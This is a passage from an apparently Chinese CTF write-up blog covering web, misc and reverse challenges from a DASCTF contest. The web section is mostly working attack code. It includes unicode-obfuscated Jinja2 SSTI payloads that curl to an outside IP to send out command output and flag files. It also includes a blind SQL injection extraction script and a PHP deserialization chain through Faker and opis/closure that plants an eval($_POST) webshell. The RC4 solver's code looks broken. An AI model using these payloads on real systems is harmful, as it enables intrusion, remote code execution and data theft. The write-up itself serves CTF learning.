class="line">&#123;%set%0afll=&quot;\u0066\u006c\u0061\u0067&quot;%&#125;</span><br><span class="line">&#123;%set%0amh=&quot;:&quot;%&#125;</span><br><span class="line">&#123;%set%0atest=dict(whoami=a)|join%&#125;</span><br><span class="line">&#123;%set%0aw=lipsum|attr(als)|attr(e)(o)|attr(ppp)(test)|attr(rd)()%&#125;</span><br><span class="line">&#123;%set%0acmd=(dict(curl=a)|join,space,dict(http=a)|join,mh,f,f,82,pt,156,pt,2,pt,166,mh,5657,f,w)|join%&#125;</span><br><span class="line">&#123;%set%0ashell=(lipsum|attr(als))|attr(e)(o)|attr(ppp)(cmd)%&#125;</span><br></pre></td></tr></table></figure>

<p>别的师傅的正确的<code>payload</code>（能理解，但是没想到🥀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%if(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0075\u0072\u006c\u0020\u0038\u0032\u002e\u0031\u0035\u0036\u002e\u0032\u002e\u0031\u0036\u0036\u003a\u0032\u0033\u0033\u0033\u002f\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u0031\u0061\u0067\u0067\u0067\u0067\u0068\u0065\u0072\u0065\u0020\u007c\u0062\u0061\u0073\u0065\u0036\u0034\u0060&quot;))%&#125;test&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<p>利用万能for循环构造payload</p>
<p><a href="https://www.cnblogs.com/hetianlab/p/14154635.html">https://www.cnblogs.com/hetianlab/p/14154635.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;%endif%&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>注意中间的<code>&#123;&#123;……&#125;&#125;</code>需要改成<code>&#123;%……%&#125;</code>，unicode编码绕过，用<code>__getitem__</code>代替中括号</p>
<p>相应的payload类似：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;</span><br></pre></td></tr></table></figure>

<p>所以需要构造的payload为（注意eval处也要加上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__.__getitem__(__builtins__).__getitem(eval)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;%endif%&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>构造最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%for%0ac%0ain%0a&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()%&#125;&#123;%if%0a(c|attr(&quot;\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f&quot;))==&quot;\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073&quot;%&#125;&#123;%if%0a(c|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0038\u0032\u002e\u0031\u0035\u0036\u002e\u0032\u002e\u0031\u0036\u0036\u003a\u0032\u0033\u0033\u0033\u002f\u0060\u0077\u0068\u006f\u0061\u006d\u0069\u0060\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)%&#125;aaa&#123;%%0aendif%0a%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendfor%0a%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绝对防御"><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h3><blockquote>
<p>复现</p>
</blockquote>
<p>从js文件中发现 SUPERAPI.php</p>
<p>查看源码可以发现存在id参数，存在sql注入，前面过滤了一些特殊符号但是bp传输可以发现前端会跳转但是这里不会，说明那些过滤一点用都没有</p>
<p><img src="https://img-blog.csdnimg.cn/d7378e40d1b7476f8c9a9bc78afcd3b9.png" alt="img"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c13ddec7-2847-49da-a9ac-5fa290687898.node4.buuoj.cn:81/SUPPERAPI.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">126</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># payload = &quot;1 and ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;1 and ascii(substr((select group_concat(password) from users where username=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h3><blockquote>
<p>复现</p>
</blockquote>
<ul>
<li>php引用绕过wakeup | 闭包函数的反序列化</li>
</ul>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247495952&idx=1&sn=989d3f31b154890ebeea701332b3b893&chksm=fbf46b60cc83e2761c083f40f24f0e41d5e9a1b24e1e9fedd911bec243b6f0dd2883323ccc70&mpshare=1&scene=23&srcid=07266JSqMiz5bR6HIwpDfHDL&sharer_sharetime=1658823612725&sharer_shareid=029344dcf9624c2d719bc3d553ed4aa3#rd">DASCTF｜2022DASCTF7月赋能赛官方Write Up (qq.com)</a></p>
<p>源码</p>
<p>查看Cookie发现存在user值，base64解码之后是User类序列化之后的字符串，想着能不能从<code>User#__destruct</code> 入手，但是没找到存在<code>__get</code>的原生类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_password = md5(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_username = base64_encode(<span class="keyword">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="keyword">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="keyword">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>学习学习学习！！！</strong></p>
<p>存在<code>composer.json</code> 泄露，<code>fakerphp/faker</code> 依赖不是很熟悉，但是<code>opis/closure</code> 的相关知识在之前做过一点分析直接用composer导入两个依赖</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;require&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;fakerphp/faker&quot;</span>: <span class="string">&quot;^1.19&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;opis/closure&quot;</span>: <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>导入：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">composer require fakerphp/faker</span><br><span class="line">composer require opis/closure</span><br></pre></td></tr></table></figure>

<p>接下去就是先审计了，前面卡在了没找到存在可利用的<code>__get</code> 魔术方法的原生类，那么现在再全局搜索一下</p>
<p>在<code>Generator</code>类中存在可利用的，在format方法中调用到call_user_func_array，但是类里面又有__wakeup使得formatters 数组被清空，因此我们需要绕过这个点，其实这个在之前nepnep中遇到过类似的，额，应该说是一模一样，也就是<strong>Laravel 9.1.8</strong> 其中一条的链子，</p>
<p><a href="https://xz.aliyun.com/t/11362#toc-10">https://xz.aliyun.com/t/11362#toc-10</a></p>
<p><img src="https://img-blog.csdnimg.cn/0423c927c8e04f49a58502a5e61775dc.png" alt="Untitled"></p>
<p>那么只要把<code>$this-&gt;formatters</code> 为我们可控属性的引用，那么当我们的修改该值的时候相应的也会修改<code>$this-&gt;formatters</code> 从而绕过wakeup。而User类在反序列化的时候<code>__wakeup</code>魔术方法中会修改<code>$this-&gt;password = $this-&gt;_password;</code> ，而<code>$this-&gt;_password</code> 又是我们可控的，而<code>User#__wakeup</code> 又是在最后才会调用，所以就能实现对<code>$this-&gt;formatters</code> 的修改了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        trigger_deprecation(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>exp1:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="built_in">Generator</span>(<span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(str_replace(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,urldecode(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>), serialize(<span class="keyword">new</span> User())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = &amp;<span class="variable">$user</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/e98f8e9c74c64309aa2a985c7d1d6a37.png" alt="Untitled"></p>
<p>但是参数我们不可控，不过既然存在闭包函数反序列化的依赖，那就直接利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">require</span>(<span class="string">&#x27;vendor/opis/closure/autoload.php&#x27;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ameuu&#x27;</span>]);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable">$b</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="built_in">Generator</span>(<span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;unserialize(<span class="variable">$b</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(str_replace(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,urldecode(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>), serialize(<span class="keyword">new</span> User())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = &amp;<span class="variable">$user</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0caadf13a45b4a929f65768f52e51efe.png" alt="Untitled"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ez-forenisc"><a href="#ez-forenisc" class="headerlink" title="ez_forenisc"></a>ez_forenisc</h3><p>先挂载爆破出Bitlock的秘钥</p>
<p><img src="https://img-blog.csdnimg.cn/e23ff324b85e44378e36533f7b83a36d.png" alt="img"></p>
<p>打开之后，发现一个cipher跟txt，txt没用，cipher里面是一个图片，zsteg分析后，有一个zip，用zsteg提取出来</p>
<p><img src="https://img-blog.csdnimg.cn/6204c2ad94d2472ab7d3fd3dde3c1118.png" alt="img"></p>
<p>得到一个压缩包</p>
<p><img src="https://img-blog.csdnimg.cn/3c28e006957e4241a879ff3bdaf7f98f.png" alt="img"></p>
<p>然后去找登录密码</p>
<p>取证大师直接梭</p>
<p>得到</p>
<p> 550f37c7748e  </p>
<p>然后解压,再那去看，有事一个key，估计还有东西没找到</p>
<p><img src="https://img-blog.csdnimg.cn/9a8ae703b14d433fb7777aa8e38dfc5c.png" alt="img"></p>
<p>查看屏幕截图，发现还有一个thes3cret</p>
<p><img src="https://img-blog.csdnimg.cn/7bc0dfe418e1400994839bd907d20604.png" alt="img"></p>
<p>dump下来</p>
<p><img src="https://img-blog.csdnimg.cn/2cec127e9d874d71b72993979424ed3f.png" alt="img"></p>
<p>一串base，可以先拿去解密，已经可以猜到是aes了</p>
<p><img src="https://img-blog.csdnimg.cn/65997bf949f244edbec709370f34e773.png" alt="img"></p>
<p>看到是Salted开头，确定是aes，然后解密得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/00206183e0a746509ee1f319ad04da1c.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;2df05d6846ea7a0ba948da44daa7dc88&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Colorful-Strips-赛后复现"><a href="#Colorful-Strips-赛后复现" class="headerlink" title="Colorful Strips(赛后复现)"></a>Colorful Strips(赛后复现)</h3><p>转灰度，用jio转，试了下ps要调参数，否则会丢失色彩信息，参数可以调，但试了下很模糊，等预期解吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;flag.jpg&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/319a0ee6b9f14685a6666ab19c187c24.png" alt="img"></p>
<h3 id="听说你是个侦探-赛后复现"><a href="#听说你是个侦探-赛后复现" class="headerlink" title="听说你是个侦探(赛后复现)"></a>听说你是个侦探(赛后复现)</h3><p>可以爆破密码，写个字典，最后跑出来ICYBETRAYALS</p>
<p>然后根据提示，试了下盲水印但是不行，最后敏感的察觉一下文件名，异或，很无语</p>
<p><img src="https://img-blog.csdnimg.cn/b706ba5a6e8b4afbbbec514efbe46733.png" alt="img"></p>
<p>前面改成DASCTF就行</p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="隐秘的角落"><a href="#隐秘的角落" class="headerlink" title="隐秘的角落"></a>隐秘的角落</h3><p>关键函数main_checkflag，输入经过rc4加密后和main_enc进行校验，密钥main_enc_key：thisiskkk</p>
<p>main_init_0中对main_enc进行初始化异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        <span class="keyword">return</span> s_box</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">        plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">        res = []</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">            box[i], box[j] = box[j], box[i]</span><br><span class="line">            t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">            k = box[t]</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">            cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> %cipher)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> cipher</span><br><span class="line">a=[<span class="number">0xD8</span>, <span class="number">0xE5</span>, <span class="number">0x85</span>, <span class="number">0xBE</span>, <span class="number">0xE7</span>, <span class="number">0xF8</span>, <span class="number">0x58</span>, <span class="number">0x75</span>, <span class="number">0x95</span>, <span class="number">0x65</span>, </span><br><span class="line"><span class="number">0x85</span>, <span class="number">0xE3</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x59</span>, <span class="number">0xB9</span>, <span class="number">0x14</span>, <span class="number">0x6F</span>, <span class="number">0x33</span>, <span class="number">0xB5</span>, </span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x0B</span>, <span class="number">0xE7</span>, <span class="number">0x92</span>, <span class="number">0x0E</span>, <span class="number">0xD2</span>, <span class="number">0xFD</span>, <span class="number">0x64</span>, <span class="number">0x18</span>, </span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xD0</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x44</span>, <span class="number">0x3E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            a[i]^=<span class="number">0x23</span></span><br><span class="line">key=<span class="string">&quot;thisiskkk&quot;</span></span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 